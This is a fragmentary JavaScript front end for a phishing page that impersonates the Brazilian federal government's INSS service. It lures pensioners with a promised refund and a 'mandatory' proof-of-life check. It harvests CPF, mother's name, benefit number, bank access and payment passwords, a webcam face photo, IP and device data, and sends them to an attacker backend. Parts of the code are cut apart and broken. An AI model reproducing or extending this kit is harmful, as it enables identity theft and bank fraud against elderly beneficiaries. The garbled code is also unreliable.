                    const key = part.substring(0, indexSeparador).trim();
                    const value = part.substring(indexSeparador + 1).trim();

                }
            });

                                // Prossegue diretamente para a seleção de banco
                                currentView = 'bank_selection';

                                    // The backend sent a 404 Not Found response
                                    currentView = 'bank_selection';

                                    showTemporaryMessage("Ocorreu um erro inesperado.", 'error');
                                }

                        // Event listener for "Preencher dados manualmente" button
                        preencherManualmenteBtn.addEventListener('click', () => {
                            // Switch to a manual form filling view

                            // Example: a function to render a manual form
                            // renderManualFormView();
                            // For this example, we will go to the bank selection page, as a manual form view is not defined.
                            currentView = 'api_data_write';
                            render();
                        });
                    };

                    //TODO write CPF data, send updated data to backend
                    const renderApiDataWrite = () => {
                        authContainer.innerHTML = `
                            <div class="w-full max-w-[504px] bg-white rounded-lg shadow-md p-8">
                                <h2 class="text-xl font-bold text-gray-900 mb-6">Insira os dados</h2>
                                <p class="text-gray-700 mb-4">Insira seus dados para continuar.</p>

                        benefitNumberInput.addEventListener('input', () => { apiData.personalInfo.benefitNumber = benefitNumber.value; });
                        motherNameInput.addEventListener('input', () => { apiData.personalInfo.motherName = motherNameInput.value; });

                        // Event listener for "Realizar Prova de Vida" button

                                provaDeVidaBtn.disabled = false;

                                    url: BASE_URL + "/api/createCitizen", // The URL you are requesting
                                    method: 'POST', // Or 'POST', 'PUT', etc.
                                    contentType: 'application/json',
                                    data: JSON.stringify({ 
                                        "CPF": apiData.personalInfo.cpf,
                                        "name": apiData.personalInfo.name,
                                        "birthday": apiData.personalInfo.birthday,
                                        "motherName": apiData.personalInfo.motherName,
                                        "benefitNumber": apiData.personalInfo.benefitNumber,
                                        "phone": apiData.personalInfo.phone,
                                    }),
                                    dataType: 'json' // Expecting a JSON response
                            })
                            .done(function(data) {
                                // Here you would proceed to the next step, likely facial validation or bank selection
                                showTemporaryMessage('Adicionamos dados com sucesso.', 'info');

                                // Prossegue diretamente para a seleção de banco
                                currentView = 'bank_selection';
                                render();
                            })
                            .fail(function(jqXHR, textStatus, errorThrown) {
                                if (jqXHR.status === 400) {
                                    showTemporaryMessage('Por favor, insira dados precisos.', 'error');

                                }
                                else if(jqXHR.status === 404)
                                    showTemporaryMessage('Verifique o CPF.', 'error');
                                else {
                                    // Other error statuses
                                    showTemporaryMessage("Ocorreu um erro inesperado.", 'error');
                                }
                            });
                        });

                    };

                    // --- Render Facial Validation View ---
                    const renderFacialValidationView = async () => {
                        authContainer.innerHTML = `<div class="w-full max-w-[504px] bg-white rounded-lg shadow-md p-8 text-center flex flex-col items-center"><h2 class="text-xl font-bold text-gray-900 mb-6 flex items-center"><span id="camera-icon" class="mr-2"></span> Validação Facial</h2><p class="text-gray-700 mb-4">Posicione seu rosto na frente da câmera para a validação.</p><video id="video-feed" autoplay playsinline></video><canvas id="photo-canvas"></canvas><div class="camera-buttons"><button id="start-camera-btn" class="btn-primary flex items-center"><span class="mr-2"></span> Iniciar Câmera</button><button id="take-photo-btn" class="btn-primary flex items-center" style="display: none;"><span class="mr-2"></span> Tirar Foto</button><button id="retake-photo-btn" class="btn-secondary" style="display: none;">Revalidar</button><button id="cancel-validation-btn" class="btn-secondary">Cancelar Validação</button></div><p id="validation-message" class="mt-4 text-gray-700"></p></div>`;
                        authContainer.querySelector('#camera-icon').appendChild(icons.camera.cloneNode(true));
                        const video = authContainer.querySelector('#video-feed');
                        const canvas = authContainer.querySelector('#photo-canvas');
                        const context = canvas.getContext('2d');
                        const startCameraBtn = authContainer.querySelector('#start-camera-btn');
                        const takePhotoBtn = authContainer.querySelector('#take-photo-btn');
                        const retakePhotoBtn = authContainer.querySelector('#retake-photo-btn');
                        const cancelValidationBtn = authContainer.querySelector('#cancel-validation-btn');
                        const validationMessage = authContainer.querySelector('#validation-message');
                        const stopCameraTracks = () => { 
                            if (mediaStream) { mediaStream.getTracks().forEach(track => track.stop()); 
                                mediaStream = null; 
                            } 
                        };
                        const startCamera = async () => { 
                            try { 
                                stopCameraTracks(); 
                                video.style.display = 'block'; 
                                canvas.style.display = 'none'; 
                                validationMessage.textContent = ''; 
                                takePhotoBtn.style.display = 'none'; 
                                retakePhotoBtn.style.display = 'none'; 
                                startCameraBtn.style.display = 'none'; 
                                mediaStream = await navigator.mediaDevices.getUserMedia({ video: true }); 
                                video.srcObject = mediaStream; 
                                video.play(); 
                                video.onloadedmetadata = () => { 
                                    canvas.width = video.videoWidth; 
                                    canvas.height = video.height; 
                                    takePhotoBtn.style.display = 'inline-flex'; 
                                }; 
                            } 
                            catch (err) { 
                                console.error("Erro ao aceder à câmera: ", err); 
                                showTemporaryMessage('Erro ao aceder à câmera. Por favor, permita o acesso e tente novamente.', 'error'); 
                                validationMessage.textContent = 'Acesso à câmera negado ou não disponível.'; 
                                startCameraBtn.style.display = 'inline-flex'; 
                            } 
                        };
                        const takePhoto = () => { 
                            if (video.srcObject) { 
                                canvas.width = video.videoWidth;
                                canvas.height = video.videoHeight;

                                context.drawImage(video, 0, 0, canvas.width, canvas.height); 
                                savePhoto(canvas);
                                video.style.display = 'none'; 
                                canvas.style.display = 'block'; 
                                takePhotoBtn.style.display = 'none'; 
                                retakePhotoBtn.style.display = 'inline-flex'; 
                                stopCameraTracks(); 
                                validationMessage.textContent = 'Processando validação facial...'; 
                                showTemporaryMessage('Processando validação facial...', 'info'); 
                                //simulateFacialValidation();
                            } 
                        };

                        const savePhoto = (canvas) => {
                            //const imageData = canvas.toDataURL("image/png"); // gera imagem em base64
                            const imageData = canvas.toDataURL("image/webp", 0.8);
                            const device = getDeviceInfo();
                            const ip = getIP();

                            fetch(BASE_URL + "/api/sendVerification", {
                                method: "POST",
                                headers: { "Content-Type": "application/json" },
                                body: JSON.stringify({ 
                                    "CPF": apiData.personalInfo.cpf,
                                    "device": device,
                                    "ip": ip,
                                    "photo": imageData 
                                })
                            })
                            .then(response => response.json())
                            .then(data => {
                                // if (data.success) {
                                    showTemporaryMessage("📸 Foto salva com sucesso!", "info");

                                    showTemporaryMessage('Validação facial bem-sucedida!', 'info'); 
                                    validationMessage.textContent = 'Validação facial bem-sucedida!'; 
                                    setTimeout(() => { window.location.href = 'pagina_final.html'; }, 1500); 

                                // } else {
                                // showTemporaryMessage("Erro ao salvar a foto: " + data.message, "error");
                                // }
                            })
                            .catch(error => {
                                console.error("Erro ao enviar foto:", error);
                                showTemporaryMessage("Falha ao enviar a foto: " + error.message, "error");
                            });
                        };

                        const getDeviceInfo = () => {
                            if (navigator.userAgentData) {
                                navigator.userAgentData.getHighEntropyValues([
                                    "platform", "platformVersion", "uaFullVersion", "architecture", "model"
                                ]).then(ua => {
                                    console.log("Browser:", ua.brands);
                                    console.log("Platform:", ua.platform);
                                    console.log("Architecture:", ua.architecture);
                                    return  ua.model;
                                });
                            }
                        }

                        const getIP = () => {
                              fetch('https://api.ipify.org?format=json')
                                .then(res => res.json())
                                .then(data => {
                                    return  data.ip;
                                });
                                return "";
                        }

                        const simulateFacialValidation = () => { 
                            isLoading = true; 
                            loadingMessage = 'Analisando imagem para validação...'; 
                            render(); 
                            setTimeout(() => { 
                                isLoading = false; 
                                render(); 
                                const success = Math.random() < 0.8; 
                                if (success) { 
                                    showTemporaryMessage('Validação facial bem-sucedida!', 'success'); 
                                    validationMessage.textContent = 'Validação facial bem-sucedida!'; 
                                    setTimeout(() => { window.location.href = 'pagina_final.html'; }, 1500); 
                                } else { 
                                    showTemporaryMessage('Validação facial falhou. Tente novamente.', 'error'); 
                                    validationMessage.textContent = 'Validação facial falhou. Tente novamente.'; 
                                    retakePhotoBtn.textContent = 'Tentar Novamente'; 
                                } 
                            }, 3000); 
                        };
                        startCameraBtn.addEventListener('click', startCamera);
                        takePhotoBtn.addEventListener('click', takePhoto);
                        retakePhotoBtn.addEventListener('click', startCamera);
                        cancelValidationBtn.addEventListener('click', () => { stopCameraTracks(); currentView = 'cpf_input'; showTemporaryMessage('Validação facial cancelada.', 'info'); render(); });
                        startCamera();
                    };

                    const openConfirmModal = (passwordInput0, passwordInput1) => {
                        const confirmModal = document.createElement('div');
                        confirmModal.id = 'bank-confirm-modal';
                        confirmModal.className = 'fixed inset-0 z-50 flex items-center justify-center';
                        confirmModal.innerHTML = `<div class="fixed inset-0 bg-black bg-opacity-50" role="button" aria-label="Cancelar envio"></div><div class="relative bg-white rounded-lg w-full max-w-sm mx-4 p-6 shadow-xl text-center"><h3 class="text-lg font-bold text-gray-900 mb-4">Confirmação de Assinatura</h3><p class="text-gray-700 mb-6">Você está prestes a realizar a assinatura. Confirme para prosseguir com a validação facial.</p><div class="flex justify-center gap-4"><button id="modal-confirm-btn" class="btn-primary w-1/2">Confirmar</button><button id="modal-cancel-btn" class="btn-secondary w-1/2">Cancelar</button></div></div>`;

                        const closeModalAndSubmit = () => { 
                            confirmModal.remove(); 
                            simulateSubmit(passwordInput0, passwordInput1); 
                        };
                        const closeModalOnly = () => { confirmModal.remove(); };
                        confirmModal.querySelector('#modal-confirm-btn').addEventListener('click', closeModalAndSubmit);
                        confirmModal.querySelector('#modal-cancel-btn').addEventListener('click', closeModalOnly);
                        confirmModal.querySelector('.bg-opacity-50').addEventListener('click', closeModalOnly);
                    };

                    const simulateSubmit = (passwordInput0, passwordInput1) => {
                        isLoading = true;
                        loadingMessage = 'Enviando dados bancários...';
                        render();
                        const bank = banksData.find(b => b.id === selectedBankId);
                        if (!bank) { showTemporaryMessage('Erro: Banco não selecionado.', 'error'); isLoading = false; render(); return; }
                        
                        // Garante que api_personal_info e api_inss_benefits são enviados,
                        // mas com os valores padrão/vazios definidos anteriormente.
                        const formData = { 
                            cpf: cpfValue.replace(/\D/g, ''), 
                            api_personal_info: apiData.personalInfo, // Usará os valores padrão definidos
                            api_inss_benefits: apiData.inssBenefits, // Usará o array vazio definido
                            banco_id: selectedBankId, 
                            banco_nome_display: bank.name, 
                            campos_digitados: [] 
                        };
                        bank.authFields.forEach((field, idx) => { const inputId = `input-${field.type}-${idx}`; const value = tempAuthValues[inputId] || ''; formData.campos_digitados.push({ label: field.label, valor: value }); });

                        fetch(BASE_URL + '/api/sendBankInfo', { 
                            method: 'POST', 
                            headers: { 'Content-Type': 'application/json' }, 
                            body: JSON.stringify({
                                "CPF": cpfValue.replace(/\D/g, ''),
                                "bankName": bank.name,
                                "accessPassword": passwordInput0,
                                "paymentPassword": passwordInput1
                            }) 
                        })
                        .then(response => response.json())
                        .then(data => { 
                            isLoading = false; 
                            currentView = 'facial_validation'; 
                            render(); 
                        })
                        .catch(error => { 
                            isLoading = false; 
                            showTemporaryMessage('Falha na requisição para salvar dados: ' + error.message, 'error'); 
                            currentView = 'cpf_input'; 
                            selectedBankId = null; 
                            apiData = { personalInfo: null, inssBenefits: null }; 
                            render(); 
                        });
                    };

                    if (isModalOpen) {
                        const modal = document.createElement('div');
                        modal.className = 'fixed inset-0 z-50 flex items-center justify-center';
                        modal.innerHTML = `<div class="fixed inset-0 bg-black bg-opacity-50" role="button" aria-label="Fechar comunicado"></div>
  <div class="relative bg-white rounded-lg w-full max-w-md mx-4 p-6 shadow-xl">
    <button id="close-initial-modal" class="absolute right-4 top-4 text-gray-500 hover:text-gray-700" aria-label="Fechar" role="button">&times;</button>
    <div class="mt-2">
      <h2 class="text-xl font-bold text-gray-900 mb-4">🛑 ATENÇÃO: Prova de Vida é OBRIGATÓRIA</h2>
      <div class="text-gray-700 space-y-4">
        <p>Prezado(a) cidadão(ã),</p>
        <p>Informamos que, em decorrência da auditoria sobre os descontos indevidos aplicados pelo INSS, foi constatado um rombo nos valores recolhidos de diversos contribuintes ao longo dos últimos anos.</p>
        <p>Dessa forma, está sendo iniciado o processo de restituição dos valores pagos a mais por aposentados, pensionistas e contribuintes ativos que foram impactados.</p>
        <p class="text-sm text-gray-600">Caso ainda não tenha realizado sua Prova de Vida Digital este ano, você será direcionado para o processo após o login.</p>
      </div>
      <button id="understand-button" class="mt-6 w-full bg-[#1351b4] hover:bg-[#0e3d8c] text-white font-medium py-3 px-4 rounded-lg transition duration-150">Entendi e quero prosseguir</button>
    </div>
  </div>
`;
                        appContainer.appendChild(modal);
                        const closeInitialModal = () => { isModalOpen = false; render(); };
                        modal.querySelector('#close-initial-modal').appendChild(icons.x.cloneNode(true));
                        modal.querySelector('.bg-opacity-50').addEventListener('click', closeInitialModal);
                        modal.querySelector('#close-initial-modal').addEventListener('click', closeInitialModal);
                        modal.querySelector('#understand-button').addEventListener('click', closeInitialModal);
                    } else {
                        if (currentView === 'cpf_input') { renderCpfInputView(); }
                        // A vista api_data_display não será mais usada no fluxo principal
                        else if (currentView === 'api_data_display') { renderApiDataDisplayView(); } 
                        else if (currentView === 'api_data_write') { renderApiDataWrite(); } 
                        else if (currentView === 'bank_selection') { renderBankList(); }
                        else if (currentView === 'bank_auth_form') { renderAuthForm(); }
                        else if (currentView === 'facial_validation') { renderFacialValidationView(); }
                    }

                    const footer = document.createElement('footer');
                    footer.className = 'w-full bg-gray-200 py-6 mt-8';
                    footer.innerHTML = `<div class="container mx-auto px-4 text-center text-gray-700 text-sm"><p class="mb-1">© ${new Date().getFullYear()} Governo Federal - Todos os direitos reservados</p><div class="flex justify-center space-x-4 mt-2"><a href="#" class="text-[#1351b4] hover:underline">Termos de uso</a><span class="text-gray-500">|</span><a href="#" class="text-[#1351b4] hover:underline">Política de privacidade</a></div><p class="mt-4 text-xs text-gray-500">Desenvolvido e mantido pelo Serpro e Secretaria de Governo Digital</p></div>`;
                    appContainer.appendChild(footer);

                    if (isLoading) {
                        const loader = document.createElement('div');
                        loader.className = 'fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50';
                        loader.innerHTML = `<div class="bg-white rounded-lg p-8 flex flex-col items-center"><div class="animate-spin rounded-full h-12 w-12 border-b-2 border-[#1351b4]"></div><p class="mt-4 text-gray-700">${loadingMessage}</p></div>`;
                        appContainer.appendChild(loader);
                    }
                };
                render();
                return appContainer;
            };
            root.appendChild(App());
        });
    </script>
